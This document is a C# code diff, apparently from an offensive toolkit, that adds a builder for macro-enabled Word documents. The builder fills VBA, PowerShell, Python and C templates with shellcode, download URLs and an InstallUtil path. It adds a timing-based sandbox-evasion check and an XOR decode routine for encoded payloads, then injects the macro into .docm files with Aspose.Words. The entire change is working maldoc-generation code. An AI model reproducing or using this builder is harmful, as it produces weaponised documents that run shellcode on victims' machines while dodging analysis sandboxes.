@@ -1,11 +1,17 @@
-﻿using System;
+﻿using Aspose.Words;
+using Aspose.Words.Saving;
+using Aspose.Words.Vba;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.RegularExpressions;
 using static System.Net.Mime.MediaTypeNames;
+using Word = Microsoft.Office.Interop.Word;
 
 
 
@@ -15,25 +21,29 @@ using static System.Net.Mime.MediaTypeNames;
 
 namespace Build
 {
-    internal class Entry
+    internal class Entry_build
     {
 
-        
+
 
 
         private static int Main(string[] args)
         {
-            BuildTemplates(args);
+            Console.WriteLine("test");
+            GenerateMacroDocs(args);
 
-            if (args.Length < 1 || string.IsNullOrWhiteSpace(args[0]))
-            {
-                Console.Error.WriteLine("Missing solution directory argument.");
-                return 1;
-            }
 
-            ConsolidateArtifacts(args);
+            //BuildTemplates(args);
 
-            BuildTemplates(args);
+            //if (args.Length < 1 || string.IsNullOrWhiteSpace(args[0]))
+            //{
+            //    Console.Error.WriteLine("Missing solution directory argument.");
+            //    return 1;
+            //}
+
+            //ConsolidateArtifacts(args);
+
+            //BuildTemplates(args);
 
 
 
@@ -367,8 +377,195 @@ namespace Build
 
 
         }
+
+
+
+
+        public static void GenerateMacroDocs(string[] args)
+        {
+
+            string baseDir = Path.GetFullPath(args[0]);
+            string searchDir = baseDir + @"\Templates\vba\";
+            string outputDir = baseDir + @"\artifacts\docm\";
+
+
+            if (Directory.Exists(outputDir))
+            {
+                Directory.Delete(outputDir, true);
+                Directory.CreateDirectory(outputDir);
+            }
+
+
+
+
+            string[] files = Directory.GetFiles(searchDir);
+
+            foreach (string file in files)
+            {
+                if (!file.EndsWith(".vba"))
+                    continue;
+
+                FileInfo fi = new FileInfo(file);
+                string outFile = outputDir + fi.Name.Replace(".vba", "") + ".docm";
+                string macroText = DeTemplate(File.ReadAllText(file),fi, args);
+
+                InjectMacro(file, outFile, macroText);
+            }
+
+
+
+        }
+
+        public static void InjectMacro(string inputPath, string outputPath, string macroText)
+        {
+
+            var document = new Document(inputPath);
+
+            // Create a VBA project if the document does not already contain one.
+            if (document.VbaProject == null)
+            {
+                document.VbaProject = new VbaProject
+                {
+                    Name = "NewMacros"
+                };
+            }
+
+            string moduleName = CONFIG.MACRO_NAME;
+
+
+            VbaModule module = document.VbaProject.Modules[moduleName];
+
+            if (module == null)
+            {
+                module = new VbaModule
+                {
+                    Name = moduleName,
+                    Type = VbaModuleType.ProceduralModule,
+                    SourceCode = macroText
+                };
+
+                document.VbaProject.Modules.Add(module);
+            }
+            else
+            {
+                // Replace the code if the module already exists.
+                module.SourceCode = macroText;
+            }
+
+            document.Save(
+                outputPath,
+                new OoxmlSaveOptions(SaveFormat.Docm));
+        }
     
+        public static string DeTemplate(string Input, FileInfo fi, string[] args)
+        {
+            string output = Input;
+
+            bool FunctionsAdded = false;
+
+            for (int i=0;i<=5;i++)
+            {
+
+                output = output.Replace("{MACRO_NAME}", CONFIG.MACRO_NAME);
+                output = output.Replace("{HTTP_URL}", CONFIG.HTTP_URL);
+                output = output.Replace("{BINARY_NAME}", CONFIG.BINARY_NAME);
+                output = output.Replace("{WAIT_TIME_SECONDS}", CONFIG.WAIT_TIME_SECONDS);
+                output = output.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
+                output = output.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
+                output = output.Replace("{INSTALL_UTIL_EXE_PATH}", CONFIG.INSTALL_UTIL_EXE_PATH);
+
+                //This block is going to add a simple time check to any VBA macros
+                if (CONFIG.DETECT_SANDBOX_TIME)
+                {
+                    StringBuilder sb = new StringBuilder();
+                    if (fi.Extension == ".vba")
+                    {
+                        sb.AppendLine($"    Dim t1 As Date");
+                        sb.AppendLine($"    Dim t2 As Date");
+                        sb.AppendLine($"    Dim time As Long");
+                        sb.AppendLine($"    t1 = Now()");
+                        sb.AppendLine($"    Sleep (2000)");
+                        sb.AppendLine($"    t2 = Now()");
+                        sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
+                        sb.AppendLine($"    If time < 2 Then");
+                        sb.AppendLine($"        Exit Function");
+                        sb.AppendLine($"    End If");
+                    }
+
+                    output = output.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
+                }
+                else
+                {
+                    output = output.Replace("{DETECT_SANDBOX_TIME}", "");
+                }
+
+                if (!FunctionsAdded)
+                {
+                    if (fi.Extension == ".ps1")
+                    {
+                        if (CONFIG.ENCODED)
+                        {
+                            string ff = $"{args[0]}\\Templates\\tmp_ps_decode_func.txt";
+                            string func = File.ReadAllText(ff);
+                            output = func + "\n\n" + output;
+                        }
+                    }
+
+                    FunctionsAdded = true;
+                }
 
 
+                //Convert shellcode strings to appropriate language
+                if (fi.Extension == ".ps1")
+                {
+                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.ps1));
+
+                    if (CONFIG.ENCODED)
+                    {
+                        output = output.Replace("{DECODE}", $"${CONFIG.SHELLCODE_NAME} = Decode-Buffer -InputBuffer ${CONFIG.SHELLCODE_NAME} -Key ([byte]0x{CONFIG.KEY.ToString("X2")})");
+                    }
+
+                }
+                else if (fi.Extension == ".vba")
+                {
+                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.vba));
+                }
+                else if (fi.Extension == ".py")
+                {
+                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.python));
+                }
+                else if (fi.Extension == ".c" || fi.Extension == ".cpp" || fi.Extension == ".h" || fi.Extension == ".hpp")
+                {
+                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE, ByteCodeLang.c));
+                }
+
+                output = output.Replace("{DECODE}", "");
+
+
+            }
+
+
+            return output;
+        }
+    
     }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 }
